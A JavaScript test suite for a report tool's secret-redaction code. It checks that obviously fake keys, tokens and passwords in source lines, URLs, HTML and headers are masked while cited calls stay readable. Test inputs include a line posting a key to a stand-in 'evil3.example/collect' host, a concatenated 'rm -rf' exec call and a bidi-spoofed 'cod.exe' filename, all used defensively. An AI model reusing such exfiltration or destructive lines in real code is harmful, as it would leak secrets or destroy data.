// Source lines and printed strings: masking that does not depend on reading
// a line's syntax, the cited call kept readable, and linear time on long
// lines. Inputs are reviewer findings; every secret is an obvious fake.
import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { scrubDeep, scrubText, sourceText } from "../src/redact.mjs";
import { renderHtml } from "../src/report/html.mjs";
import { displayLdflags } from "../src/rules/go.mjs";
import { continuation, sourceLine } from "../src/source-line.mjs";
import { displayPath, displayUrl } from "../src/urls.mjs";
import { app, at, evaluate, fact, side } from "./helpers.mjs";

// The snippet as a report prints it: through the report's scrubbing too.
const shown = (line, needle, reading = {}) =>
  scrubDeep(
    sourceText(sourceLine(line, Math.max(0, line.indexOf(needle)), reading)),
  );

const assertMasked = (line, needle, secrets, reading = {}) => {
  const text = shown(line, needle, reading);
  for (const secret of secrets)
    assert.ok(!text.includes(secret), `${secret} shown in ${text}`);
  assert.ok(text.includes(needle), `${needle} lost from ${text}`);
  return text;
};

// Values behind regex literals, comments, JSX apostrophes and escapes.
const SYNTAX_CASES = [
  [
    `export const a = (s) => fetch("https://n1.example/v1?q=" + s.replace(/'/g, ""), { headers: { "x-api-key": "FAKEkey1A2B3C4D5" } });`,
    "fetch(",
    ["FAKEkey1A2B3C4D5"],
  ],
  [
    `export const b = (h) => fetch("https://n2.example/v1", { headers: h }); // curl -H "Authorization: Bearer FAKEbearer0123456789xyz"`,
    "fetch(",
    ["FAKEbearer0123456789xyz"],
  ],
  [
    `export const c = (u) => /^https?:\\/\\//.test(u) && fetch("https://n3.example/v1", { headers: { "x-api-key": "FAKEkey3x9y8z7w6" } });`,
    "fetch(",
    ["FAKEkey3x9y8z7w6"],
  ],
  [
    `export const d = () => fetch("https://n4.example/v1", { body: JSON.stringify({ user: "admin", password: "FAKEpw!9x" }) }); /* password: "FAKEpw!9x" */`,
    "fetch(",
    ["FAKEpw!9x"],
  ],
  [
    `<p>Don't refresh</p><script src="https://cdn.n16.example/w.js"></script><script>window.cfg={apiKey:"FAKEhtml0003"}</script>`,
    "<script",
    ["FAKEhtml0003"],
  ],
  [
    `/* token = "FAKEtok_9f8e7d6c5b" */ fetch(u)`,
    "fetch(",
    ["FAKEtok_9f8e7d6c5b"],
  ],
  [`t=/\\"/;h={password:"FAKEpw0006"};fetch(u)`, "fetch(", ["FAKEpw0006"]],
  [
    String.raw`const KEYS = "primary:\nsk-ant-api03-NEWLINEPRECEDEDSECRETNEWLINEPRE42"; fetch(u)`,
    "fetch(",
    ["NEWLINEPRECEDED"],
  ],
  [
    String.raw`const K = "\x73\x6b\x2d\x61\x6e\x74\x2d\x61\x70\x69\x30\x33\x2d\x46\x41\x4b\x45\x46\x41\x4b\x45\x46\x41\x4b\x45"; fetch(u)`,
    "fetch(",
    ["\\x46\\x41\\x4b\\x45\\x46"],
  ],
  [
    String.raw`const K3 = "sk-ant-api03-CONTLINE\x4cSECRETCONTLINESECRET0000088"; fetch(u)`,
    "fetch(",
    ["SECRETCONTLINE", "CONTLINE\\x4c"],
  ],
];

// JSON and form bodies inside one string, and call-argument headers.
const BODY_CASES = [
  [
    `fetch("https://n15.example/oauth/token", { method: "POST", body: '{"client_secret":"FAKEcs0001x","grant_type":"client_credentials"}' });`,
    ["FAKEcs0001x"],
  ],
  [
    'fetch("https://n17.example/v1/search", { body: `{"apiKey":"FAKEtplKey0001","q":"${s}"}` });',
    ["FAKEtplKey0001"],
  ],
  [
    `fetch(u, { body: "grant_type=client_credentials&client_secret=FAKEfb01&x=1" })`,
    ["FAKEfb01"],
  ],
  [`fetch(u, { body: "{\\"password\\":\\"FAKEjs01\\"}" })`, ["FAKEjs01"]],
  [
    `fetch(u, h.set("X-Api-Key", "FAKEhs9f8e7d6c5b4"), x.setRequestHeader("Authorization", "FAKEsrh01"))`,
    ["FAKEhs9f8e7d6c5b4", "FAKEsrh01"],
  ],
  [
    `fetch(u.searchParams.set("apikey", "FAKEsp0123456789"), u.searchParams.append("key", "FAKEsp02"))`,
    ["FAKEsp0123456789", "FAKEsp02"],
  ],
  [
    `fetch("https://t6.third.example/v1/data?".concat("apikey=FAKEcc0123"))`,
    ["FAKEcc0123"],
  ],
  [
    `fetch(["https://t7.third.example/v1/data?", "token=FAKEjn0123"].join(""))`,
    ["FAKEjn0123"],
  ],
  [
    `fetch("https://n.example/v1/data?api_key=" + "FAKEcat0123")`,
    ["FAKEcat0123"],
  ],
  [
    `fetch(u, { headers: { Authorization: "Bearer " + "FAKEbc0123456" } })`,
    ["FAKEbc0123456"],
  ],
  ["fetch(`https://${USER}:FAKEtplpw44@${HOST}/hook`)", ["FAKEtplpw44"]],
  [
    `exec("curl -H 'x-api-key: FAKEch01' https://api.example.com/v1")`,
    ["FAKEch01"],
  ],
];

// URLs that are JSON-escaped, relative or behind character references.
const URL_CASES = [
  [
    `const HOOK="https:\\/\\/hooks.chat5.example\\/services\\/T01ABCDEF\\/B02GHIJKL\\/FAKEaB3dE5gH7jK9mN1pQ3rS5tU7";export const notify=(b)=>fetch(HOOK,{body:b});`,
    "fetch(",
    ["FAKEaB3dE5gH7jK9mN1pQ3rS5tU7"],
  ],
  [
    `navigator.serviceWorker.register("sw.js?key=FAKEswKey0001"); fetch("./x?token=FAKErel1"); fetch("../api/v1?token=FAKErel2"); fetch("/api?token=FAKErel3")`,
    "fetch(",
    ["FAKEsw", "FAKErel"],
  ],
  [
    "fetch(`${BASE}/v1/search?apikey=FAKE7f3a9c2e5b1d&q=${q}`)",
    "fetch(",
    ["FAKE7f3a9c"],
  ],
  [
    `<script src="//maps.third31.example/maps/api/js?callback=init&#x26;key=FAKEk3yHexAmp1"></script>`,
    "<script",
    ["FAKEk3y"],
  ],
  [
    `<script src="//maps.third32.example/maps/api/js?callback=init&#038;key=FAKEk3yPadAmp2"></script>`,
    "<script",
    ["FAKEk3y"],
  ],
  [
    `<script src="//maps.third33.example/maps/api/js?callback=init&AMP;key=FAKEk3yCapAmp3"></script>`,
    "<script",
    ["FAKEk3y"],
  ],
  [
    `<script src="//maps.third34.example/maps/api/js?key&equals;FAKEk3yEqualsE4"></script>`,
    "<script",
    ["FAKEk3y"],
  ],
  [
    `<script src="//maps.third37.example/maps/api/js?callback=init&amp;amp;key=FAKEk3yDblAmp7"></script>`,
    "<script",
    ["FAKEk3y"],
  ],
  [
    `export const t9 = () => exec("mongosh mongodb+srv://admin:FAKEmongo42@cluster0.example.net/app --eval 1");`,
    "exec(",
    ["FAKEmongo42"],
  ],
];

// JWTs, base64 with '/', '+' or '=' padding, and long hex runs.
const TOKEN_CASES = [
  [
    `fetch("https://db5.example/rest/v1/items",{headers:{"X-Sb":"eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoic2VydmljZV9yb2xlIn0.RkFLRVNJR05BVFVSRQ"}})`,
    ["eyJyb2xl", "RkFLRVNJ"],
  ],
  [
    `const S = "FAKEaB3d+E5gH7/jK9mN1pQ3rS5tU7=="; const T = "FAKEb3dEf6hIj9kL/Op5qRs8tUv1wXy4zA1Ab3dEf6"; fetch(S)`,
    ["aB3d+E5gH7", "jK9mN1pQ3", "b3dEf6hIj9kL", "Op5qRs8t"],
  ],
  [
    `fetch("https://hooks4.example/services/0a1b2c3d4e5f60718293a4b5c6d7e8f901234567/events.json")`,
    ["0a1b2c3d4e5f6071"],
  ],
];

describe("source lines: secrets whatever the syntax", () => {
  it("masks values behind regex literals, comments, JSX apostrophes and escapes", () => {
    for (const [line, needle, secrets] of SYNTAX_CASES)
      assertMasked(line, needle, secrets);
  });

  it("masks JSON and form bodies inside one string, and call-argument headers", () => {
    for (const [line, secrets] of BODY_CASES)
      assertMasked(line, line.startsWith("exec") ? "exec(" : "fetch(", secrets);
  });

  it("masks URLs that are JSON-escaped, relative or behind character references", () => {
    for (const [line, needle, secrets] of URL_CASES)
      assertMasked(line, needle, secrets, {
        file: line.startsWith("<") ? "index.html" : "src/app.js",
      });
  });

  it("masks JWTs, base64 with '/', '+' or '=' padding, and long hex runs", () => {
    for (const [line, secrets] of TOKEN_CASES)
      assertMasked(line, "fetch(", secrets);
  });
});

describe("source lines: what stays readable", () => {
  it("keeps code that reads a secret, readable paths and content-hashed names", () => {
    for (const line of [
      `const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY, baseURL: "https://api.openai.com/v1" });`,
      `const SYNC = "https://api.acmenotes.example/v2/sync"; fetch("/rest/v1/items"); fetch("https://api.openai.com/v1/chat/completions");`,
      `<script src="https://cdn.vendor-widgets.example/js/main-9f8e7d6c5b4a39281706.min.js"></script>`,
      `<script src="https://cdn.vendor-widgets.example/js/tracker.0a1b2c3d4e5f60718293a4b5c6d7e8f9.js"></script>`,
      `fetch("https://i18n5.example/locales/en.0a1b2c3d4e5f6a7b8c9d.json"); import("./assets/index-9pQe1VxR.js");`,
    ])
      assert.equal(sourceLine(line), line);
  });

  it("never lets a misread quote swallow the cited call", () => {
    // On a sensitive line the call's string arguments are masked too.
    const cases = [
      [
        `const n=s.split(/'/).length;fetch("https://n26.example/v1/"+a.replace(/\\s/g,""),{method:"POST"})`,
        `fetch("https://n26.example/v1/"+a.replace(`,
      ],
      [
        `const t=<p>Don't panic</p>;exec("rm -rf "+dir.replace(/\\//g,"-"))`,
        `exec("rm -rf "+dir.replace(`,
      ],
      [
        `export const pack = (s, out) => { const parts = s.split(/'/); return exec("tar -czf " + out); };`,
        `exec("tar -czf " + out)`,
      ],
      [
        `${'key:"'.repeat(30)};export const boot=()=>fetch("https://w3.example/boot");`,
        `fetch("https://w3.example/boot")`,
      ],
    ];
    for (const [line, call] of cases) {
      const name = call.match(/\w+\(/)[0];
      assert.ok(shown(line, name).includes(call), shown(line, name));
      assert.ok(
        shown(line, name, { sensitive: true }).includes(name),
        shown(line, name, { sensitive: true }),
      );
    }
    // A quote inside a regex literal or a word does not close a string.
    for (const [line] of cases.slice(0, 3))
      assert.ok(
        shown(line, "(", { sensitive: true }).startsWith(line.slice(0, 12)),
      );
  });

  it("maps the cited column through masks, so the call stays in the window", () => {
    const filler = Array.from(
      { length: 60 },
      (_, index) =>
        `c${index}={apiKey:"${"K9".repeat(30)}",t:\`/api/\${q}?token=${"T7".repeat(20)}\`};`,
    ).join("");
    const line = `${filler}fetch("https://n18.example/v1/MARK");${filler}`;
    const text = sourceLine(line, filler.length);
    assert.ok(text.includes(`fetch("https://n18.example/v1/MARK")`), text);
    assert.ok(text.length <= 200, text);
  });

  it("gives a query value the tag its claim gives it", () => {
    for (const url of [
      "https://n6.example/v1?sig=FAKE%2Bdef%2Fghi123",
      "https://n24.example/v1?key=FAKE+plus+0002",
      "https://n9.example/v1/FAKEabcdefghij1234567890KLMN/x?key=FAKEQVALUE",
    ]) {
      const tags = displayUrl(url).match(/‹[0-9a-f]{6}›/g);
      const snippet = sourceLine(`fetch("${url}")`);
      for (const tag of tags) assert.ok(snippet.includes(tag), snippet);
    }
  });
});

describe("source lines: sensitive lines", () => {
  const key = "sk-proj-DEMO-not-a-real-key-000000000000000000";

  it("masks every string but URLs and keywords, and shorter token-like words", () => {
    const text = assertMasked(
      `const K="${key}";const A="FAKEshort01";export const send=()=>fetch("https://evil3.example/collect?k=FAKEq1",{body:K,method:"POST"});`,
      "fetch(",
      [key.slice(8), "FAKEshort01", "FAKEq1"],
      { sensitive: true },
    );
    assert.match(text, /sk-proj-…0000 \(46 characters\)/);
    assert.match(text, /fetch\("https:\/\/evil3\.example\/collect\?k=‹/);
    assert.ok(text.includes('method:"POST"'), text);
  });

  it("masks a continued key fragment before the cited call", () => {
    assertMasked(
      `FAKEqRs8tUv1wXy";async function show(t){const r=await fetch("https://api.openai.com/v1/chat/completions",{method:"POST"})}`,
      "fetch(",
      ["FAKEqRs8tUv1wXy"],
      { sensitive: true },
    );
    assert.equal(continuation(`const K="sk-proj-FAKE\\`).escaped, true);
    assert.equal(continuation(`const K="a\\\\"`).escaped, false);
    assert.equal(continuation(`x = "a\\\\\\`).escaped, true);
  });
});

describe("source lines: linear time", () => {
  const boot = `;export const boot=()=>fetch("https://w3.example/boot");`;
  const timed = (line) => {
    const started = performance.now();
    const text = sourceLine(line, line.indexOf("fetch("));
    const elapsed = performance.now() - started;
    assert.ok(text.includes("fetch("), text);
    assert.ok(elapsed < 500, `${elapsed.toFixed(0)} ms`);
  };

  it("handles a 200,000-character hex literal", () => {
    const hex = Array.from(
      { length: 200_000 },
      (_, index) => "0123456789abcdef"[(index * 7919) % 16],
    ).join("");
    timed(`const H="${hex}"${boot}`);
  });

  it("handles 1 MB minified lines around a cited call", () => {
    timed(
      `${"a=b+c;d=e*f;".repeat(90_000)}fetch("https://x.example/v1?k=v")${";g=h/i;".repeat(20_000)}`,
    );
    timed(`const P="${"=/".repeat(500_000)}"${boot}`);
    timed(`x=${"('".repeat(500_000)}${boot}`);
    timed(`${'key:"'.repeat(200_000)}${boot}`);
    timed(
      `${Array.from({ length: 20_000 }, (_, index) => `"https://a${index}.example/x?q=${index}&t=${"Q1".repeat(15)}"`).join(",")}${boot}`,
    );
  });
});

describe("one owner for digests, hashed names and URL text", () => {
  it("keeps a digest only before a static asset file", () => {
    const h40 = "0a1b2c3d4e5f60718293a4b5c6d7e8f901234567";
    const h64 = "4f3c2b1a".repeat(8);
    assert.ok(displayPath(`/assets/${h64}/main.js`).includes(h64));
    for (const path of [
      `/notify/${h64}/send.json`,
      `/notify/${h64}/v1.0`,
      `/services/${h40}/events.json`,
      `/d/${h40}/invoice.pdf`,
      `/acme/w/${h40}/dist/w.js`,
    ])
      assert.ok(
        !displayPath(path).includes(h40.slice(0, 16)) &&
          !displayPath(path).includes(h64.slice(0, 16)),
        path,
      );
    assert.equal(
      displayPath("/a/manifest.0a1b2c3d4e5f6a7b8c9d.json"),
      "/a/manifest.0a1b2c3d4e5f6a7b8c9d.json",
    );
    assert.ok(
      !displayPath("/v1/FAKEaB3dE5gH7jK9mN1pQ3rS5tU7.js").includes("FAKE"),
    );
  });

  it("never decodes a path to a control or bidirectional character", () => {
    const url = "https://n19.example/files/%E2%80%AEcod.exe?sig=FAKEsig0001";
    assert.equal(
      displayUrl(url).split("?")[0],
      "https://n19.example/files/%E2%80%AEcod.exe",
    );
    const html = renderHtml({
      ...emptyReport,
      findings: [{ ...emptyFinding, title: "a\u202ecod.exe\u0007" }],
    });
    assert.ok(!html.includes("\u202e") && !html.includes("\u0007"));
  });

  it("masks relative specifiers and paths in header values and prose", () => {
    for (const [text, secret] of [
      ["registers sw.js?key=FAKEswKey0001 as a worker", "FAKEsw"],
      ["loads ./x?token=FAKEdot01 and ../api/v1?token=FAKEdot02", "FAKEdot"],
      ["loads [/api?token=FAKEbr0001] and `/api?token=FAKEbt0001`", "FAKEb"],
      [
        "default-src 'self'; report-uri csp-report?token=FAKEnoslash99",
        "FAKEnoslash",
      ],
      [
        "default-src *; report-uri /csp/r/FAKECSPRELATIVETOKEN0123abcd",
        "FAKECSP",
      ],
      [
        "default-src *; report-uri //csp.example/r/FAKEPROTOPATHTOKEN0abc123",
        "FAKEPROTO",
      ],
      [
        "exec mongosh mongodb+srv://admin:FAKEmongo42@cluster0.example.net/app",
        "FAKEmongo",
      ],
    ])
      assert.ok(!scrubText(text).includes(secret), scrubText(text));
    const csp = "script-src 'self' https://cdn.example.net; connect-src *";
    assert.equal(scrubText(csp), csp);
  });

  it("masks a -X flag written as its own quoted field", () => {
    const flags = displayLdflags(
      `-s "-X" "main.token=Bearer FAKEsepquoted0123456" -X main.endpoint=https://t.example/v1`,
    );
    assert.equal(
      flags,
      `-s "-X" "main.token=… (27 characters)" -X main.endpoint=https://t.example/v1`,
    );
  });
});

const emptyFinding = {
  id: "F1",
  rule: "RW-X00",
  severity: "low",
  title: "",
  summary: "",
  why: "",
  evidence: [],
  unknowns: [],
  recommendation: "",
  component: "app",
};
const emptyReport = {
  product: "Acme",
  labels: { left: "v1", right: "v2" },
  verdict: {
    decision: "pass",
    counts: { critical: 0, high: 0, medium: 0, low: 0 },
  },
  components: [],
  errors: [],
  findings: [],
  limitations: [],
  tool: { name: "Release Watch", version: "0" },
  generated_at: "2026-01-01T00:00:00.000Z",
  run: { rea_calls: [], elapsed_ms: 0, llm_tokens: 0 },
};

describe("prompt previews", () => {
  it("keeps URLs readable, masks secrets and prints no unkeyed digest", () => {
    const module = "src/ai.js";
    const prompt = (text) =>
      app({
        imports: [
          fact("openai", { specifier: "openai", module }, at(module, 1)),
        ],
        modules: new Map([
          [
            module,
            {
              externalImports: new Set(["openai"]),
              local: new Set(),
              imported: new Map(),
            },
          ],
        ]),
        stringLiterals: [
          fact(
            `${module}#P`,
            { module, value: text, binding: "P" },
            at(module, 2),
          ),
        ],
      });
    const [finding] = evaluate(
      side(
        "v1",
        prompt(
          "You are a helpful assistant for AcmeNotes. Answer questions politely.",
        ),
      ),
      side(
        "v2",
        prompt(
          "You are helpful. Read https://docs.acmenotes.example/v2/guide.html?token=FAKEpp01 and sign with FAKEq8Zk2MwX7pTr4NvB9yHc please.",
        ),
      ),
    );
    const claim = scrubDeep(finding.evidence[1].claim);
    assert.ok(
      claim.includes("https://docs.acmenotes.example/v2/guide.html?token=‹"),
      claim,
    );
    assert.ok(!/FAKE|sha256/.test(claim), claim);
  });
});
